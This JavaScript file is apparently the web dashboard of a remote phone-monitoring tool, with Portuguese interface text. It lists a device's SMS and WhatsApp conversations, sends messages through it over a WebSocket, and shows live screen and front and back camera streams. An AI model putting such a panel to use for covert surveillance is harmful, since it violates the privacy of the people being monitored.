function fbIsImage(ext) { return ['jpg','jpeg','png','gif','webp'].includes((ext||'').toLowerCase()); }
function fbFormatSize(bytes) {
    if (bytes < 1024) return `${bytes}B`;
    if (bytes < 1024*1024) return `${(bytes/1024).toFixed(1)}KB`;
    if (bytes < 1024*1024*1024) return `${(bytes/1024/1024).toFixed(1)}MB`;
    return `${(bytes/1024/1024/1024).toFixed(2)}GB`;
}

// ─── WhatsApp Web-style Messages Panel ───────────────────────────────────────

// conversationsMap: address → { messages: [], lastMsg, lastTime, unread }
const conversationsMap = new Map();
let currentWaAddress = null;

function waNormalizeChatKey(nameOrAddr) {
    if (!nameOrAddr) return '';
    let key = nameOrAddr.trim();
    // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
    key = key.replace(/\s*[\(\[]\d+\s+mensagens?\s*(novas?)?[\)\]].*$/i, '');
    key = key.replace(/\s*:\s*\d+\s+mensagens?.*$/i, '');
    key = key.replace(/\s*:.*$/, '');
    return key.trim();
}

function waIngestMessage(m) {
    const rawAddr = (m.address && m.address.trim()) ? m.address.trim() : '';
    const rawName = (m.name && m.name.trim()) ? m.name.trim() : '';
    // Group by normalized address; if no address, use normalized name; fallback to system
    const addr = waNormalizeChatKey(rawAddr) || waNormalizeChatKey(rawName) || '(sistema)';
    const name = rawName || rawAddr || '(sistema)';
    if (!m.source) m.source = 'sms';
    if (!conversationsMap.has(addr)) {
        conversationsMap.set(addr, { name: name, messages: [], lastMsg: '', lastTime: 0, unread: 0 });
    }
    const conv = conversationsMap.get(addr);
    // Prefer the first non-generic name we see
    if (conv.name === '(sistema)' && name !== '(sistema)') conv.name = name;
    conv.messages.push(m);
    conv.lastMsg = m.content || '';
    if (m.timestamp > conv.lastTime) conv.lastTime = m.timestamp;
}

function waAddMessage(m) {
    waIngestMessage(m);
    // If this conversation is currently open, append the bubble live
    const addr = waNormalizeChatKey((m.address && m.address.trim()) ? m.address.trim() : ((m.name && m.name.trim()) ? m.name.trim() : '(sistema)'));
    if (currentWaAddress === addr) {
        const pane = document.getElementById('wa-messages');
        if (pane) {
            pane.appendChild(waBuildBubble(m));
            pane.scrollTop = pane.scrollHeight;
        }
    }
}

function waRenderSidebar() {
    const list = document.getElementById('wa-convlist');
    if (!list) return;

    if (conversationsMap.size === 0) {
        list.innerHTML = '<div class="wa-convlist-empty"><i class="fa-solid fa-comment-slash"></i><p>Nenhuma conversa</p></div>';
        return;
    }

    const sorted = [...conversationsMap.entries()].sort((a, b) => b[1].lastTime - a[1].lastTime);
    list.innerHTML = '';

    sorted.forEach(([addr, conv]) => {
        const item = document.createElement('div');
        item.className = 'wa-conv-item' + (addr === currentWaAddress ? ' wa-conv-active' : '');
        item.dataset.addr = addr;
        item.onclick = () => waSelectConversation(addr);

        const displayName = waNormalizeChatKey(conv.name) || waNormalizeChatKey(addr);
        const showSubtitle = (conv.name && waNormalizeChatKey(conv.name) !== waNormalizeChatKey(addr) && addr !== '(sistema)')
            ? `<span class="wa-conv-subtitle">${escapeHtml(waFormatPhone(addr))}</span>`
            : '';
        const initialSource = displayName.replace(/\D/g, '')[0] || displayName[0] || '?';
        const timeStr = conv.lastTime ? new Date(conv.lastTime).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) : '';
        const preview = escapeHtml((conv.lastMsg || '').substring(0, 38)) + ((conv.lastMsg || '').length > 38 ? '…' : '');
        const unreadHtml = conv.unread > 0 ? `<span class="wa-unread">${conv.unread}</span>` : '';
        // Determine dominant source for the conversation (whatsapp if any message is whatsapp)
        const isWhatsApp = conv.messages.some(msg => msg.source === 'whatsapp');
        const sourceIcon = isWhatsApp
            ? '<span class="wa-source wa-source-wa" title="WhatsApp"><i class="fa-brands fa-whatsapp"></i></span>'
            : '<span class="wa-source wa-source-sms" title="SMS"><i class="fa-solid fa-comment-sms"></i></span>';

        item.innerHTML = `
            <div class="wa-conv-avatar">${escapeHtml(initialSource.toUpperCase())}</div>
            <div class="wa-conv-info">
                <div class="wa-conv-top">
                    <span class="wa-conv-name">${escapeHtml(displayName)}</span>
                    <span class="wa-conv-time">${timeStr}</span>
                </div>
                <div class="wa-conv-bottom">
                    ${sourceIcon}
                    <span class="wa-conv-preview">${preview}</span>
                    ${unreadHtml}
                </div>
                ${showSubtitle}
            </div>`;
        list.appendChild(item);
    });
}

function waSelectConversation(addr) {
    currentWaAddress = addr;
    const conv = conversationsMap.get(addr);
    if (!conv) return;

    conv.unread = 0;

    // Sidebar active state
    document.querySelectorAll('.wa-conv-item').forEach(el => {
        el.classList.toggle('wa-conv-active', el.dataset.addr === addr);
    });

    // Header
    const displayName = waNormalizeChatKey(conv.name) || waFormatPhone(addr);
    const subtitle = (conv.name && waNormalizeChatKey(conv.name) !== waNormalizeChatKey(addr) && addr !== '(sistema)')
        ? waFormatPhone(addr)
        : `${conv.messages.length} mensagem(ns)`;
    document.getElementById('wa-chat-name').textContent = displayName;
    document.getElementById('wa-chat-sub').textContent = subtitle;
    document.getElementById('wa-avatar').textContent = (displayName.replace(/\D/g, '')[0] || displayName[0] || '?').toUpperCase();
    document.getElementById('wa-footer').style.display = 'flex';

    // Render messages
    const pane = document.getElementById('wa-messages');
    pane.innerHTML = '';

    let lastDate = '';
    conv.messages.forEach(msg => {
        const msgDate = new Date(msg.timestamp).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
        if (msgDate !== lastDate) {
            const sep = document.createElement('div');
            sep.className = 'wa-date-sep';
            sep.textContent = msgDate;
            pane.appendChild(sep);
            lastDate = msgDate;
        }
        pane.appendChild(waBuildBubble(msg));
    });

    pane.scrollTop = pane.scrollHeight;
}

function waBuildBubble(msg) {
    const bubble = document.createElement('div');
    bubble.className = `wa-bubble ${msg.direction === 'out' ? 'wa-bubble-out' : 'wa-bubble-in'}`;
    const time = new Date(msg.timestamp).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    const tick = msg.direction === 'out' ? '<i class="fa-solid fa-check-double wa-tick"></i>' : '';
    const sourceBadge = msg.source === 'whatsapp'
        ? '<span class="wa-bubble-source wa-bubble-source-wa" title="WhatsApp"><i class="fa-brands fa-whatsapp"></i></span>'
        : '<span class="wa-bubble-source wa-bubble-source-sms" title="SMS"><i class="fa-solid fa-comment-sms"></i></span>';

    let bodyHtml = `<span class="wa-bubble-text">${escapeHtml(msg.content || '')}</span>`;

    // Detect media URLs in content (image/video/audio)
    const imageMatch = (msg.content || '').match(/https?:\/\/\S+\.(jpg|jpeg|png|webp|gif)(\?\S*)?/i);
    const videoMatch = (msg.content || '').match(/https?:\/\/\S+\.(mp4|webm|mov)(\?\S*)?/i);
    const audioMatch = (msg.content || '').match(/https?:\/\/\S+\.(mp3|m4a|aac|ogg|opus)(\?\S*)?/i);
    const genericUrlMatch = (msg.content || '').match(/https?:\/\/\S+/);

    if (imageMatch) {
        bodyHtml = `<img class="wa-bubble-img" src="${escapeHtml(imageMatch[0])}" alt="imagem" onclick="window.open(this.src,'_blank')">` + bodyHtml;
    } else if (videoMatch) {
        bodyHtml = `<video class="wa-bubble-video" src="${escapeHtml(videoMatch[0])}" controls></video>` + bodyHtml;
    } else if (audioMatch) {
        bodyHtml = `<audio class="wa-bubble-video" src="${escapeHtml(audioMatch[0])}" controls></audio>` + bodyHtml;
    } else if (genericUrlMatch) {
        bodyHtml = `<a href="${escapeHtml(genericUrlMatch[0])}" target="_blank" class="wa-bubble-link">📎 Abrir arquivo</a>` + bodyHtml;
    }

    bubble.innerHTML = `
        ${bodyHtml}
        <div class="wa-bubble-meta">
            ${sourceBadge}
            <span class="wa-bubble-time">${time}</span>
            ${tick}
        </div>`;
    return bubble;
}

function waFormatPhone(addr) {
    if (addr === '(sistema)') return '⚙ Sistema';
    const digits = addr.replace(/\D/g, '');
    if (digits.length === 13 && digits.startsWith('55')) {
        return `+55 (${digits.slice(2,4)}) ${digits.slice(4,9)}-${digits.slice(9)}`;
    }
    if (digits.length === 12 && digits.startsWith('55')) {
        return `+55 (${digits.slice(2,4)}) ${digits.slice(4,8)}-${digits.slice(8)}`;
    }
    if (digits.length === 11) {
        return `(${digits.slice(0,2)}) ${digits.slice(2,7)}-${digits.slice(7)}`;
    }
    if (digits.length === 10) {
        return `(${digits.slice(0,2)}) ${digits.slice(2,6)}-${digits.slice(6)}`;
    }
    return addr;
}

function waFilter(query) {
    const q = query.toLowerCase();
    document.querySelectorAll('.wa-conv-item').forEach(el => {
        const name = el.querySelector('.wa-conv-name')?.textContent.toLowerCase() || '';
        const subtitle = el.querySelector('.wa-conv-subtitle')?.textContent.toLowerCase() || '';
        const preview = el.querySelector('.wa-conv-preview')?.textContent.toLowerCase() || '';
        el.style.display = (!q || name.includes(q) || subtitle.includes(q) || preview.includes(q)) ? '' : 'none';
    });
}

function sendMessage() {
    const input = document.getElementById('message-input');
    if (!input) return;
    const text = input.value.trim();
    if (!text || !currentDeviceId) {
        if (!currentDeviceId) logToConsole('Nenhum dispositivo selecionado!', 'error');
        return;
    }
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify({ command: 'SEND_MESSAGE', deviceId: currentDeviceId, message: text }));
        input.value = '';
    } else {
        logToConsole('Sem conexão com o servidor!', 'error');
    }
}

// ─── Simple markdown formatter ────────────────────────────────────────────────

// Simple markdown formatter helper for bold, bullet points, and code blocks
function formatMarkdown(text) {
    let html = escapeHtml(text);
    
    // Bold: **text**
    html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    
    // Bullet points: * text or - text
    html = html.replace(/^\s*[\*\-]\s+(.*?)$/gm, '<li>$1</li>');
    html = html.replace(/(<li>.*?<\/li>)/gs, '<ul>$1</ul>');
    // Remove duplicate consecutive <ul> tags
    html = html.replace(/<\/ul>\s*<ul>/g, '');
    
    // Newlines
    html = html.replace(/\n/g, '<br>');

    return html;
}

// ── Fullscreen stream modal ────────────────────────────────────────────────────
function openFullscreen(type) {
    currentFsType = type;
    const modal = document.getElementById('fullscreen-modal');
    const fsImg = document.getElementById('fs-stream-img');
    const fsPh  = document.getElementById('fs-placeholder');
    const fsTitle = document.getElementById('fs-title');
    const fsInfo  = document.getElementById('fs-info');

    const titles = { screen: '🖥️ Tela ao Vivo', front: '📷 Câmera Frontal', back: '📸 Câmera Traseira' };
    if (fsTitle) fsTitle.innerHTML = `<i class="fa-solid fa-video"></i> ${titles[type] || 'Transmissão'}`;

    // Copy current frame to fullscreen
    let srcImg = null;
    if (type === 'screen') srcImg = document.getElementById('screen-stream-img');
    else if (type === 'front') srcImg = document.getElementById('cam-stream-img');
    else if (type === 'back')  srcImg = document.getElementById('cam-back-stream-img');

    if (srcImg && srcImg.src && srcImg.style.display !== 'none') {
        fsImg.src = srcImg.src;
        fsImg.style.display = 'block';
        if (fsPh) fsPh.style.display = 'none';
    } else {
        fsImg.src = '';
        fsImg.style.display = 'none';
        if (fsPh) fsPh.style.display = 'flex';
    }

    if (fsInfo) {
        const isLive = (type === 'screen' && isScreenStreaming) || (type !== 'screen' && isCameraStreaming && activeCameraType === type);
        fsInfo.textContent = isLive ? '● Transmissão ao vivo — clique fora ou ESC para sair' : 'Stream offline — inicie a transmissão primeiro';
    }

    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    // Try native fullscreen API
    if (modal.requestFullscreen) modal.requestFullscreen().catch(() => {});
    else if (modal.webkitRequestFullscreen) modal.webkitRequestFullscreen();
}

function closeFullscreen() {
    currentFsType = null;
    const modal = document.getElementById('fullscreen-modal');
    modal.style.display = 'none';
    document.body.style.overflow = '';

    if (document.fullscreenElement) document.exitFullscreen().catch(() => {});
    else if (document.webkitFullscreenElement) document.webkitExitFullscreen();
}

function updateFsFrame(url) {
    if (!currentFsType) return;
    const fsImg = document.getElementById('fs-stream-img');
    const fsPh  = document.getElementById('fs-placeholder');
    if (fsImg) { fsImg.src = url; fsImg.style.display = 'block'; }
    if (fsPh)  fsPh.style.display = 'none';
}

function fsStopStream() {
    if (!currentFsType) return;
    if (currentFsType === 'screen') { toggleScreenStream(); }
    else { toggleCameraStream(currentFsType); }
    closeFullscreen();
}

function togglePiP() {
    const fsImg = document.getElementById('fs-stream-img');
    if (fsImg && document.pictureInPictureEnabled) {
        // PiP works on video elements; show a toast instead
        alert('PiP requer elemento de vídeo. Use a tela cheia nativa do navegador (F11).');
    }
}

// ESC key closes fullscreen modal
document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && currentFsType) closeFullscreen();
});

// Handle browser native fullscreen exit (user pressed ESC on native FS)
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement && currentFsType) {
        const modal = document.getElementById('fullscreen-modal');
        if (modal && modal.style.display !== 'none') closeFullscreen();
    }
});

